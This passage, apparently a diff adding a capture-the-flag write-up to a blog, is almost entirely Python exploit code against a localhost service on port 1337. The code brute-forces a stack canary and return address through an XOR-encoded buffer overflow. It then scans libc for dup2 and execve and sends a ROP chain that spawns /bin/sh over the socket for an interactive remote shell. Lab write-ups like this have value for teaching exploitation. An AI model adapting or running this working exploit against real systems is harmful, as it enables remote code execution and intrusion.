+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(libc_page <span style="color:#f92672">^</span> Ds)   <span style="color:#75715e"># buffer = page</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1337</span>)   <span style="color:#75715e"># pop r15, dont-care</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(page_size <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># length</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(text_section_write_plt <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        page_data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(page_size)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(page_data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> dup2_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>            dup2_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(dup2_start)
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Found dup2 @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(dup2_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> execve_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>            execve_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(execve_start)
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Found execve @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(execve_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        libc_page <span style="color:#f92672">-=</span> page_size  <span style="color:#75715e"># scan down</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># scan up</span>
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;scanning up&#34;</span>
+</span></span><span style="display:flex;"><span>libc_page <span style="color:#f92672">=</span> unpack(write_libc) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> dup2_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> execve_remote_addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(libc_page <span style="color:#f92672">^</span> Ds)   <span style="color:#75715e"># buffer = page</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1337</span>)   <span style="color:#75715e"># pop r15, dont-care</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(page_size <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># length</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(text_section_write_plt <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        page_data <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(page_size)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(page_data) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> dup2_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>            dup2_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(dup2_start)
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Found dup2 @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(dup2_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> execve_start <span style="color:#f92672">in</span> page_data:
+</span></span><span style="display:flex;"><span>            execve_remote_addr <span style="color:#f92672">=</span> libc_page <span style="color:#f92672">+</span> page_data<span style="color:#f92672">.</span>index(execve_start)
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Found execve @ </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(execve_remote_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        libc_page <span style="color:#f92672">+=</span> page_size  <span style="color:#75715e"># scan down</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;libc scan over&#34;</span>
+</span></span></code></pre></div><p>Note: one loop for scanning down, same loop for scanning up - yeah I know it&rsquo;s terrible code but it worked for me when I was constructing it and I wanted to make it more clear for the writeup so I decided to keep it.</p>
+<p>That&rsquo;s it, we have all of the information we need. Now we just construct the payload with the ROP chain, place a &ldquo;/bin/sh&rdquo; string on the stack and plug that to the <code>execve</code> which we will execute at the end of it:</p>
+<p>The last part of the exploit looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Final payload for remote shell</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>  <span style="color:#75715e"># address of that is buffer_start_addr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># close(0)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># first, we ret here &lt;---- (</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop this to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(text_section_close_plt <span style="color:#f92672">^</span> Ds)           <span style="color:#75715e"># ret there</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># close(1)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># return from above to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop this to RDI</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(text_section_close_plt <span style="color:#f92672">^</span> Ds)           <span style="color:#75715e"># ret there</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># dup2(4,0)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># return from above to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop this to RDI (socket&#39;s FD)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds) <span style="color:#75715e"># ret to this gadget</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)                 <span style="color:#75715e"># pop rsi</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)       <span style="color:#75715e"># pop r15 (dont care)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(dup2_remote_addr <span style="color:#f92672">^</span> Ds)           <span style="color:#75715e"># call dup2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># dup2(4,1)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># return from above to here</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># pop this to RDI (socket&#39;s FD)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># ret to this gadget</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1</span> <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># pop rsi</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)  <span style="color:#75715e"># pop r15 (dont care)</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(dup2_remote_addr <span style="color:#f92672">^</span> Ds)  <span style="color:#75715e"># call dup2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># When back from dup2, load arguments for execve</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack_bin_sh <span style="color:#f92672">=</span> buffer_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">224</span>  <span style="color:#75715e"># will be placed in a few line from now</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(stack_bin_sh <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Second argument for execve = NULL</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Third argument for execve = NULL</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># jump to execve</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64((gadget_pop_rdx_ret <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(execve_remote_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># place /bin/sh on the stack </span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([chr(ord(t) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">0x0</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>)  <span style="color:#75715e"># terminating null</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pad to the end of buffer</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(canary <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(buffer_addr <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(text_section_leave_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)  <span style="color:#75715e"># server hello</span>
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#interactive mode</span>
+</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> Telnet()
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> sock
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;Starting interactive session:&#34;</span>
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>interact()
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>Note: to use an interactive mode for the shell I used <code>from telnetlib import Telnet</code> to make it easier to interact with the server once I have shell.</p>
+<p>Final script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> telnetlib <span style="color:#f92672">import</span> Telnet
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ds <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0d0d0d0d0d0d0d0d</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">p64</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>, s)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unpack</span>(s):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;Q&#34;</span>, s)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SERVER <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(p):
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect(SERVER)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>send(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        line <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Username found!&#34;</span> <span style="color:#f92672">in</span> line
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_next_byte</span>(prefix):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> test_byte <span style="color:#f92672">in</span> [chr(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> send_payload(prefix <span style="color:#f92672">+</span> test_byte):
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Found:&#34;</span>, hex(ord(test_byte))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> prefix <span style="color:#f92672">+</span> test_byte
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_n_bytes</span>(prefix, n):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> prefix
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> leak_next_byte(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> unpack(payload[<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>:]) <span style="color:#f92672">^</span> Ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> len(payload))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Leaking canary&#34;</span>, 
+</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> leak_n_bytes(payload, <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Leaking old RBP&#34;</span>
+</span></span><span style="display:flex;"><span>    old_rbp <span style="color:#f92672">=</span> leak_n_bytes(payload <span style="color:#f92672">+</span> p64(canary <span style="color:#f92672">^</span> Ds) , <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(old_rbp))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Leaking return address&#34;</span>
+</span></span><span style="display:flex;"><span>    ret_addr <span style="color:#f92672">=</span> leak_n_bytes(payload <span style="color:#f92672">+</span> p64(canary <span style="color:#f92672">^</span> Ds) <span style="color:#f92672">+</span> p64(old_rbp <span style="color:#f92672">^</span> Ds) <span style="color:#f92672">+</span> chr(ord(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcf</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xd</span>), <span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(hex(ret_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    text_section_base <span style="color:#f92672">=</span> ret_addr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span>    text_section_leave_ret <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc5c</span>
+</span></span><span style="display:flex;"><span>    buffer_addr       <span style="color:#f92672">=</span> old_rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x480</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf71</span>
+</span></span><span style="display:flex;"><span>    gadget_pop_rdi_ret         <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf73</span>
+</span></span><span style="display:flex;"><span>    gadget_pop_rdx_ret         <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xb53</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    text_section_write_got <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x202020</span>
+</span></span><span style="display:flex;"><span>    text_section_write_plt <span style="color:#f92672">=</span> text_section_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x910</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># After leaking the necessary values,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We create a new payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;davide&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdi_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4</span> <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rsi_pop_r15_ret <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(text_section_write_got <span style="color:#f92672">^</span> Ds)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x1337</span>)   <span style="color:#75715e"># pop r15, dont-care</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(gadget_pop_rdx_ret <span style="color:#f92672">^</span> Ds)
